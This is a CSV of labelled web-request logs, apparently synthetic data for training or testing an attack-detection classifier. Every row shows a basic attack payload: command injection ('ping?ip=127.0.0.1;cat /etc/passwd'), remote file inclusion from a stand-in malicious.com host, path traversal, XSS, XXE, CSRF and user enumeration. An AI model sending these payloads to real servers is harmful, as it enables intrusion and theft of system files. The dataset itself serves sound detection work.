ip,timestamp,request,status,size,attack_type
85.161.26.20,2025-03-15 12:21:56,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2813,COMMAND_INJECTION
129.142.164.52,2025-03-15 12:22:00,POST /wp-json/wp/v2/users HTTP/1.1,403,1097,USER_ENUMERATION
78.36.77.15,2025-03-15 12:21:06,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,679,REMOTE_FILE_INCLUSION
188.38.217.114,2025-03-15 12:22:01,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3488,REMOTE_FILE_INCLUSION
185.233.32.150,2025-03-15 12:21:54,POST /upload-xml HTTP/1.1,403,514,XXE_ATTACK
66.113.29.7,2025-03-15 12:21:08,GET /etc/passwd HTTP/1.1,403,1811,PATH_TRAVERSAL
20.186.233.22,2025-03-15 12:21:18,POST /upload-xml HTTP/1.1,403,4651,XXE_ATTACK
74.32.45.101,2025-03-15 12:21:54,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2813,XSS_ATTACK
241.166.99.164,2025-03-15 12:21:48,POST /upload-xml HTTP/1.1,403,3091,XXE_ATTACK
50.35.211.166,2025-03-15 12:21:22,GET /etc/passwd HTTP/1.1,403,2616,PATH_TRAVERSAL
213.128.90.148,2025-03-15 12:21:58,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3578,COMMAND_INJECTION
242.239.228.163,2025-03-15 12:21:44,POST /wp-json/wp/v2/users HTTP/1.1,403,2020,USER_ENUMERATION
155.146.113.16,2025-03-15 12:21:59,GET /execute?cmd=whoami HTTP/1.1,403,2140,RCE_ATTACK
159.219.97.171,2025-03-15 12:21:23,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3737,COMMAND_INJECTION
196.5.209.159,2025-03-15 12:21:19,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2523,COMMAND_INJECTION
46.35.146.75,2025-03-15 12:22:02,GET /api/user?username=admin HTTP/1.1,403,2995,API_ABUSE
119.211.148.246,2025-03-15 12:21:38,POST /wp-json/wp/v2/users HTTP/1.1,403,867,USER_ENUMERATION
71.178.237.255,2025-03-15 12:21:37,POST /upload-xml HTTP/1.1,403,1943,XXE_ATTACK
207.190.71.249,2025-03-15 12:21:48,GET /execute?cmd=whoami HTTP/1.1,403,4610,RCE_ATTACK
232.233.220.239,2025-03-15 12:22:01,GET /api/user?username=admin HTTP/1.1,403,860,API_ABUSE
48.145.174.16,2025-03-15 12:21:12,GET /api/user?username=admin HTTP/1.1,403,4818,API_ABUSE
250.98.44.176,2025-03-15 12:21:10,POST /wp-json/wp/v2/users HTTP/1.1,403,3181,USER_ENUMERATION
88.164.30.43,2025-03-15 12:21:52,POST /wp-json/wp/v2/users HTTP/1.1,403,4053,USER_ENUMERATION
14.29.170.128,2025-03-15 12:21:41,GET /api/user?username=admin HTTP/1.1,403,1701,API_ABUSE
233.215.43.58,2025-03-15 12:21:55,GET /api/user?username=admin HTTP/1.1,403,884,API_ABUSE
234.94.104.91,2025-03-15 12:21:42,GET /etc/passwd HTTP/1.1,403,4177,PATH_TRAVERSAL
146.225.73.151,2025-03-15 12:22:01,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3912,COMMAND_INJECTION
251.136.210.90,2025-03-15 12:21:29,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,894,LFI_ATTACK
7.239.146.224,2025-03-15 12:21:37,GET /execute?cmd=whoami HTTP/1.1,403,4053,RCE_ATTACK
205.78.198.149,2025-03-15 12:22:01,POST /change-email?email=attacker@example.com HTTP/1.1,200,3427,CSRF_ATTACK
198.198.84.234,2025-03-15 12:21:11,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3014,XSS_ATTACK
201.1.230.102,2025-03-15 12:21:59,POST /upload-xml HTTP/1.1,403,1682,XXE_ATTACK
60.245.8.240,2025-03-15 12:21:36,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1173,XSS_ATTACK
65.34.151.198,2025-03-15 12:21:54,POST /wp-json/wp/v2/users HTTP/1.1,403,3631,USER_ENUMERATION
141.24.224.149,2025-03-15 12:21:46,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4950,COMMAND_INJECTION
238.234.199.169,2025-03-15 12:21:08,POST /change-email?email=attacker@example.com HTTP/1.1,200,2867,CSRF_ATTACK
52.209.190.203,2025-03-15 12:21:39,GET /api/user?username=admin HTTP/1.1,403,2979,API_ABUSE
9.174.130.196,2025-03-15 12:21:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4393,LFI_ATTACK
13.81.38.11,2025-03-15 12:21:55,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4282,REMOTE_FILE_INCLUSION
229.182.231.32,2025-03-15 12:21:35,POST /wp-json/wp/v2/users HTTP/1.1,403,4164,USER_ENUMERATION
128.38.139.120,2025-03-15 12:21:41,POST /change-email?email=attacker@example.com HTTP/1.1,200,1224,CSRF_ATTACK
192.172.140.249,2025-03-15 12:21:18,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3549,LFI_ATTACK
193.215.66.41,2025-03-15 12:22:08,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2258,COMMAND_INJECTION
161.188.131.6,2025-03-15 12:21:41,POST /wp-json/wp/v2/users HTTP/1.1,403,2921,USER_ENUMERATION
128.169.87.51,2025-03-15 12:21:59,GET /etc/passwd HTTP/1.1,403,4503,PATH_TRAVERSAL
76.204.106.193,2025-03-15 12:21:19,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,987,REMOTE_FILE_INCLUSION
183.209.176.237,2025-03-15 12:21:20,GET /execute?cmd=whoami HTTP/1.1,403,3500,RCE_ATTACK
114.130.141.229,2025-03-15 12:21:33,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,884,REMOTE_FILE_INCLUSION
213.50.129.121,2025-03-15 12:21:25,POST /upload-xml HTTP/1.1,403,2359,XXE_ATTACK
197.178.210.254,2025-03-15 12:21:11,POST /change-email?email=attacker@example.com HTTP/1.1,200,4661,CSRF_ATTACK
92.11.65.13,2025-03-15 12:21:56,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,985,XSS_ATTACK
47.236.65.14,2025-03-15 12:21:32,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,764,LFI_ATTACK
90.26.148.228,2025-03-15 12:21:31,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2246,LFI_ATTACK
39.98.0.139,2025-03-15 12:21:50,POST /change-email?email=attacker@example.com HTTP/1.1,200,2865,CSRF_ATTACK
79.230.239.81,2025-03-15 12:21:54,GET /etc/passwd HTTP/1.1,403,1534,PATH_TRAVERSAL
199.35.44.204,2025-03-15 12:21:17,POST /wp-json/wp/v2/users HTTP/1.1,403,4263,USER_ENUMERATION
205.150.103.180,2025-03-15 12:21:16,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2999,REMOTE_FILE_INCLUSION
91.70.61.132,2025-03-15 12:22:06,POST /wp-json/wp/v2/users HTTP/1.1,403,942,USER_ENUMERATION
189.173.121.46,2025-03-15 12:21:49,GET /execute?cmd=whoami HTTP/1.1,403,3808,RCE_ATTACK
107.140.236.153,2025-03-15 12:21:32,POST /upload-xml HTTP/1.1,403,4735,XXE_ATTACK
138.127.64.243,2025-03-15 12:22:02,GET /execute?cmd=whoami HTTP/1.1,403,3355,RCE_ATTACK
35.247.159.207,2025-03-15 12:21:18,POST /wp-json/wp/v2/users HTTP/1.1,403,4587,USER_ENUMERATION
38.210.139.119,2025-03-15 12:22:03,POST /upload-xml HTTP/1.1,403,3581,XXE_ATTACK
214.234.97.234,2025-03-15 12:21:44,POST /change-email?email=attacker@example.com HTTP/1.1,200,1526,CSRF_ATTACK
234.168.201.177,2025-03-15 12:21:21,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3587,LFI_ATTACK
137.229.129.182,2025-03-15 12:22:07,GET /etc/passwd HTTP/1.1,403,2169,PATH_TRAVERSAL
97.147.235.245,2025-03-15 12:21:36,GET /api/user?username=admin HTTP/1.1,403,1712,API_ABUSE
180.12.40.237,2025-03-15 12:22:01,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2272,REMOTE_FILE_INCLUSION
140.208.152.109,2025-03-15 12:21:58,GET /etc/passwd HTTP/1.1,403,1748,PATH_TRAVERSAL
240.250.2.28,2025-03-15 12:21:15,POST /wp-json/wp/v2/users HTTP/1.1,403,1621,USER_ENUMERATION
118.135.167.156,2025-03-15 12:21:26,GET /api/user?username=admin HTTP/1.1,403,3668,API_ABUSE
234.182.207.91,2025-03-15 12:21:48,POST /upload-xml HTTP/1.1,403,2451,XXE_ATTACK
212.173.2.252,2025-03-15 12:21:26,POST /upload-xml HTTP/1.1,403,3506,XXE_ATTACK
158.129.75.235,2025-03-15 12:21:47,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2274,REMOTE_FILE_INCLUSION
123.222.128.141,2025-03-15 12:21:19,GET /execute?cmd=whoami HTTP/1.1,403,1407,RCE_ATTACK
4.243.59.215,2025-03-15 12:22:13,GET /etc/passwd HTTP/1.1,403,2190,PATH_TRAVERSAL
112.158.156.126,2025-03-15 12:22:11,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4768,LFI_ATTACK
204.59.50.234,2025-03-15 12:21:35,POST /change-email?email=attacker@example.com HTTP/1.1,200,2967,CSRF_ATTACK
14.224.125.9,2025-03-15 12:22:06,GET /etc/passwd HTTP/1.1,403,2674,PATH_TRAVERSAL
207.108.61.81,2025-03-15 12:21:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4561,XSS_ATTACK
203.73.117.176,2025-03-15 12:21:33,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3949,XSS_ATTACK
181.235.250.82,2025-03-15 12:22:03,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3495,XSS_ATTACK
95.173.100.69,2025-03-15 12:21:33,POST /wp-json/wp/v2/users HTTP/1.1,403,4779,USER_ENUMERATION
77.20.190.122,2025-03-15 12:21:44,GET /execute?cmd=whoami HTTP/1.1,403,566,RCE_ATTACK
56.89.205.131,2025-03-15 12:21:52,GET /execute?cmd=whoami HTTP/1.1,403,1610,RCE_ATTACK
232.32.160.19,2025-03-15 12:21:42,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,665,REMOTE_FILE_INCLUSION
119.68.141.197,2025-03-15 12:21:27,POST /wp-json/wp/v2/users HTTP/1.1,403,733,USER_ENUMERATION
192.25.218.89,2025-03-15 12:22:06,GET /api/user?username=admin HTTP/1.1,403,1399,API_ABUSE
26.245.227.2,2025-03-15 12:21:17,POST /upload-xml HTTP/1.1,403,917,XXE_ATTACK
17.176.171.30,2025-03-15 12:21:27,GET /etc/passwd HTTP/1.1,403,3260,PATH_TRAVERSAL
12.212.173.247,2025-03-15 12:22:07,GET /api/user?username=admin HTTP/1.1,403,1197,API_ABUSE
75.228.51.218,2025-03-15 12:21:24,POST /upload-xml HTTP/1.1,403,1459,XXE_ATTACK
82.81.88.236,2025-03-15 12:21:44,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1001,LFI_ATTACK
171.181.28.46,2025-03-15 12:21:49,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3989,COMMAND_INJECTION
99.5.78.109,2025-03-15 12:21:41,GET /etc/passwd HTTP/1.1,403,3071,PATH_TRAVERSAL
100.225.239.193,2025-03-15 12:21:37,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2303,REMOTE_FILE_INCLUSION
130.173.169.109,2025-03-15 12:21:32,GET /execute?cmd=whoami HTTP/1.1,403,2482,RCE_ATTACK
209.187.16.157,2025-03-15 12:22:08,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3985,XSS_ATTACK
60.153.86.188,2025-03-15 12:22:08,POST /upload-xml HTTP/1.1,403,4225,XXE_ATTACK
234.72.78.58,2025-03-15 12:21:43,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4623,LFI_ATTACK
252.133.156.177,2025-03-15 12:22:01,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4337,COMMAND_INJECTION
92.95.113.225,2025-03-15 12:21:24,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1327,REMOTE_FILE_INCLUSION
171.160.29.113,2025-03-15 12:21:37,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1491,COMMAND_INJECTION
247.117.154.78,2025-03-15 12:21:43,POST /change-email?email=attacker@example.com HTTP/1.1,200,3645,CSRF_ATTACK
81.87.86.238,2025-03-15 12:22:02,GET /execute?cmd=whoami HTTP/1.1,403,1466,RCE_ATTACK
158.190.168.208,2025-03-15 12:21:56,POST /upload-xml HTTP/1.1,403,3014,XXE_ATTACK
84.22.86.237,2025-03-15 12:21:18,POST /change-email?email=attacker@example.com HTTP/1.1,200,3267,CSRF_ATTACK
140.40.225.24,2025-03-15 12:21:41,POST /change-email?email=attacker@example.com HTTP/1.1,200,1457,CSRF_ATTACK
169.3.84.119,2025-03-15 12:21:29,POST /change-email?email=attacker@example.com HTTP/1.1,200,1833,CSRF_ATTACK
156.234.208.196,2025-03-15 12:21:39,GET /etc/passwd HTTP/1.1,403,1873,PATH_TRAVERSAL
235.153.148.6,2025-03-15 12:22:15,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,575,XSS_ATTACK
160.112.135.54,2025-03-15 12:21:19,GET /execute?cmd=whoami HTTP/1.1,403,2552,RCE_ATTACK
139.189.86.134,2025-03-15 12:21:36,POST /wp-json/wp/v2/users HTTP/1.1,403,1782,USER_ENUMERATION
13.47.8.94,2025-03-15 12:21:49,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4082,LFI_ATTACK
176.232.102.201,2025-03-15 12:21:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2722,XSS_ATTACK
180.107.131.184,2025-03-15 12:21:23,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2600,REMOTE_FILE_INCLUSION
7.28.56.19,2025-03-15 12:21:51,GET /api/user?username=admin HTTP/1.1,403,4552,API_ABUSE
189.215.196.239,2025-03-15 12:21:31,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4198,COMMAND_INJECTION
183.149.166.157,2025-03-15 12:21:40,POST /upload-xml HTTP/1.1,403,4204,XXE_ATTACK
171.151.62.233,2025-03-15 12:22:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3005,XSS_ATTACK
46.38.120.168,2025-03-15 12:22:17,GET /api/user?username=admin HTTP/1.1,403,3856,API_ABUSE
190.44.96.64,2025-03-15 12:22:06,GET /api/user?username=admin HTTP/1.1,403,3423,API_ABUSE
176.105.43.208,2025-03-15 12:21:33,POST /upload-xml HTTP/1.1,403,1782,XXE_ATTACK
91.209.109.145,2025-03-15 12:21:59,GET /etc/passwd HTTP/1.1,403,1038,PATH_TRAVERSAL
190.163.48.205,2025-03-15 12:22:18,GET /api/user?username=admin HTTP/1.1,403,1278,API_ABUSE
139.21.152.104,2025-03-15 12:21:47,POST /change-email?email=attacker@example.com HTTP/1.1,200,4142,CSRF_ATTACK
151.249.42.91,2025-03-15 12:21:53,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4354,LFI_ATTACK
193.155.117.246,2025-03-15 12:21:35,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1677,COMMAND_INJECTION
208.33.203.217,2025-03-15 12:22:14,POST /change-email?email=attacker@example.com HTTP/1.1,200,1246,CSRF_ATTACK
131.4.28.29,2025-03-15 12:21:57,POST /wp-json/wp/v2/users HTTP/1.1,403,3423,USER_ENUMERATION
7.108.224.32,2025-03-15 12:21:49,GET /execute?cmd=whoami HTTP/1.1,403,1481,RCE_ATTACK
177.164.53.9,2025-03-15 12:21:36,POST /upload-xml HTTP/1.1,403,2597,XXE_ATTACK
42.232.194.83,2025-03-15 12:22:14,POST /upload-xml HTTP/1.1,403,617,XXE_ATTACK
162.62.128.191,2025-03-15 12:22:10,GET /execute?cmd=whoami HTTP/1.1,403,2088,RCE_ATTACK
248.145.14.28,2025-03-15 12:21:37,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3394,COMMAND_INJECTION
96.126.41.131,2025-03-15 12:21:46,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1853,XSS_ATTACK
203.134.126.12,2025-03-15 12:21:41,GET /execute?cmd=whoami HTTP/1.1,403,3259,RCE_ATTACK
110.14.130.252,2025-03-15 12:21:38,GET /etc/passwd HTTP/1.1,403,3117,PATH_TRAVERSAL
235.57.7.251,2025-03-15 12:22:18,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4271,COMMAND_INJECTION
121.243.71.11,2025-03-15 12:21:43,POST /upload-xml HTTP/1.1,403,4976,XXE_ATTACK
201.148.44.93,2025-03-15 12:21:36,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3263,LFI_ATTACK
211.42.63.199,2025-03-15 12:21:26,POST /upload-xml HTTP/1.1,403,4184,XXE_ATTACK
100.252.35.247,2025-03-15 12:21:57,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1817,REMOTE_FILE_INCLUSION
208.66.58.24,2025-03-15 12:21:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2901,XSS_ATTACK
19.164.83.129,2025-03-15 12:21:26,POST /wp-json/wp/v2/users HTTP/1.1,403,4523,USER_ENUMERATION
30.25.39.102,2025-03-15 12:21:57,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1947,COMMAND_INJECTION
135.117.143.102,2025-03-15 12:21:52,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4839,LFI_ATTACK
62.15.223.229,2025-03-15 12:22:05,POST /change-email?email=attacker@example.com HTTP/1.1,200,1036,CSRF_ATTACK
73.253.29.7,2025-03-15 12:22:11,POST /upload-xml HTTP/1.1,403,2116,XXE_ATTACK
83.223.47.142,2025-03-15 12:21:28,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2468,COMMAND_INJECTION
94.231.118.110,2025-03-15 12:21:36,GET /execute?cmd=whoami HTTP/1.1,403,1508,RCE_ATTACK
158.116.186.239,2025-03-15 12:21:32,GET /execute?cmd=whoami HTTP/1.1,403,1028,RCE_ATTACK
112.11.184.60,2025-03-15 12:21:54,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1753,REMOTE_FILE_INCLUSION
58.137.77.70,2025-03-15 12:21:51,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1318,LFI_ATTACK
168.97.233.93,2025-03-15 12:22:06,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,863,XSS_ATTACK
73.21.168.43,2025-03-15 12:21:51,POST /upload-xml HTTP/1.1,403,1284,XXE_ATTACK
39.106.60.195,2025-03-15 12:21:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2980,XSS_ATTACK
211.9.154.35,2025-03-15 12:21:45,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,525,XSS_ATTACK
111.216.46.78,2025-03-15 12:22:10,POST /upload-xml HTTP/1.1,403,2118,XXE_ATTACK
237.137.209.131,2025-03-15 12:21:51,POST /change-email?email=attacker@example.com HTTP/1.1,200,2979,CSRF_ATTACK
31.201.189.207,2025-03-15 12:21:31,GET /etc/passwd HTTP/1.1,403,2901,PATH_TRAVERSAL
72.65.235.161,2025-03-15 12:21:51,GET /etc/passwd HTTP/1.1,403,1144,PATH_TRAVERSAL
230.111.125.91,2025-03-15 12:21:45,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1490,REMOTE_FILE_INCLUSION
123.29.127.20,2025-03-15 12:21:43,POST /upload-xml HTTP/1.1,403,3476,XXE_ATTACK
157.160.179.64,2025-03-15 12:21:28,POST /wp-json/wp/v2/users HTTP/1.1,403,2377,USER_ENUMERATION
186.201.22.29,2025-03-15 12:21:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2614,COMMAND_INJECTION
70.55.129.165,2025-03-15 12:22:21,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4680,COMMAND_INJECTION
5.201.147.129,2025-03-15 12:21:44,GET /api/user?username=admin HTTP/1.1,403,2602,API_ABUSE
153.11.199.168,2025-03-15 12:21:44,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,946,LFI_ATTACK
238.175.74.239,2025-03-15 12:21:43,GET /etc/passwd HTTP/1.1,403,3361,PATH_TRAVERSAL
45.51.144.109,2025-03-15 12:22:16,POST /upload-xml HTTP/1.1,403,3878,XXE_ATTACK
133.193.44.12,2025-03-15 12:22:07,GET /api/user?username=admin HTTP/1.1,403,2597,API_ABUSE
54.29.186.243,2025-03-15 12:21:29,POST /wp-json/wp/v2/users HTTP/1.1,403,1697,USER_ENUMERATION
207.228.230.238,2025-03-15 12:21:32,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1317,REMOTE_FILE_INCLUSION
119.6.66.106,2025-03-15 12:21:49,POST /upload-xml HTTP/1.1,403,1104,XXE_ATTACK
187.123.200.21,2025-03-15 12:21:44,POST /wp-json/wp/v2/users HTTP/1.1,403,4533,USER_ENUMERATION
152.177.80.243,2025-03-15 12:21:58,GET /etc/passwd HTTP/1.1,403,557,PATH_TRAVERSAL
110.92.89.135,2025-03-15 12:21:34,GET /etc/passwd HTTP/1.1,403,2590,PATH_TRAVERSAL
134.138.229.196,2025-03-15 12:21:45,GET /etc/passwd HTTP/1.1,403,3888,PATH_TRAVERSAL
86.242.36.193,2025-03-15 12:21:49,GET /execute?cmd=whoami HTTP/1.1,403,1607,RCE_ATTACK
161.40.44.97,2025-03-15 12:22:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1281,XSS_ATTACK
236.181.190.200,2025-03-15 12:21:32,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4964,REMOTE_FILE_INCLUSION
186.131.137.119,2025-03-15 12:22:18,POST /change-email?email=attacker@example.com HTTP/1.1,200,1936,CSRF_ATTACK
238.163.205.60,2025-03-15 12:21:33,GET /api/user?username=admin HTTP/1.1,403,4994,API_ABUSE
194.247.86.116,2025-03-15 12:22:11,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3579,COMMAND_INJECTION
193.121.215.207,2025-03-15 12:21:42,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4908,COMMAND_INJECTION
7.252.205.153,2025-03-15 12:22:18,POST /change-email?email=attacker@example.com HTTP/1.1,200,3190,CSRF_ATTACK
25.160.234.181,2025-03-15 12:21:32,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1517,REMOTE_FILE_INCLUSION
22.180.231.22,2025-03-15 12:22:02,POST /upload-xml HTTP/1.1,403,2592,XXE_ATTACK
144.132.238.239,2025-03-15 12:21:34,POST /upload-xml HTTP/1.1,403,3758,XXE_ATTACK
110.92.122.67,2025-03-15 12:22:03,POST /upload-xml HTTP/1.1,403,4090,XXE_ATTACK
74.127.104.98,2025-03-15 12:22:16,POST /wp-json/wp/v2/users HTTP/1.1,403,1607,USER_ENUMERATION
48.143.179.188,2025-03-15 12:22:19,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3902,LFI_ATTACK
229.12.219.222,2025-03-15 12:21:43,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2081,REMOTE_FILE_INCLUSION
28.12.28.205,2025-03-15 12:21:37,GET /etc/passwd HTTP/1.1,403,1531,PATH_TRAVERSAL
139.78.230.155,2025-03-15 12:22:06,POST /upload-xml HTTP/1.1,403,4349,XXE_ATTACK
231.156.53.171,2025-03-15 12:22:06,GET /etc/passwd HTTP/1.1,403,3633,PATH_TRAVERSAL
64.67.151.147,2025-03-15 12:22:03,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3980,XSS_ATTACK
22.93.147.37,2025-03-15 12:22:05,POST /upload-xml HTTP/1.1,403,4837,XXE_ATTACK
101.18.100.29,2025-03-15 12:22:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3781,XSS_ATTACK
129.252.234.33,2025-03-15 12:22:20,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4522,REMOTE_FILE_INCLUSION
180.30.204.124,2025-03-15 12:22:21,GET /execute?cmd=whoami HTTP/1.1,403,3331,RCE_ATTACK
105.5.73.87,2025-03-15 12:22:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1645,LFI_ATTACK
124.183.100.103,2025-03-15 12:22:23,POST /wp-json/wp/v2/users HTTP/1.1,403,1729,USER_ENUMERATION
69.198.130.143,2025-03-15 12:22:25,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4332,LFI_ATTACK
193.24.251.211,2025-03-15 12:22:06,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2623,LFI_ATTACK
129.89.120.253,2025-03-15 12:21:54,GET /etc/passwd HTTP/1.1,403,3698,PATH_TRAVERSAL
24.255.76.178,2025-03-15 12:21:46,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1422,COMMAND_INJECTION
44.21.181.151,2025-03-15 12:21:51,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2840,REMOTE_FILE_INCLUSION
5.35.236.120,2025-03-15 12:21:37,GET /api/user?username=admin HTTP/1.1,403,1785,API_ABUSE
126.148.120.155,2025-03-15 12:21:33,POST /change-email?email=attacker@example.com HTTP/1.1,200,2053,CSRF_ATTACK
54.56.99.194,2025-03-15 12:22:00,POST /upload-xml HTTP/1.1,403,919,XXE_ATTACK
73.206.249.63,2025-03-15 12:22:08,POST /change-email?email=attacker@example.com HTTP/1.1,200,574,CSRF_ATTACK
246.252.122.183,2025-03-15 12:22:05,POST /change-email?email=attacker@example.com HTTP/1.1,200,1187,CSRF_ATTACK
37.206.5.217,2025-03-15 12:21:38,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3968,COMMAND_INJECTION
230.34.191.14,2025-03-15 12:21:41,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4211,XSS_ATTACK
37.16.62.106,2025-03-15 12:22:04,GET /execute?cmd=whoami HTTP/1.1,403,4115,RCE_ATTACK
230.255.89.161,2025-03-15 12:22:21,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3625,REMOTE_FILE_INCLUSION
191.0.91.112,2025-03-15 12:21:51,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3509,LFI_ATTACK
68.17.199.140,2025-03-15 12:21:52,GET /execute?cmd=whoami HTTP/1.1,403,4315,RCE_ATTACK
41.70.13.36,2025-03-15 12:22:11,GET /etc/passwd HTTP/1.1,403,963,PATH_TRAVERSAL
171.127.115.97,2025-03-15 12:21:40,GET /api/user?username=admin HTTP/1.1,403,1857,API_ABUSE
9.19.118.186,2025-03-15 12:22:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2970,XSS_ATTACK
201.178.58.18,2025-03-15 12:22:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1916,COMMAND_INJECTION
71.171.38.188,2025-03-15 12:21:33,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2965,COMMAND_INJECTION
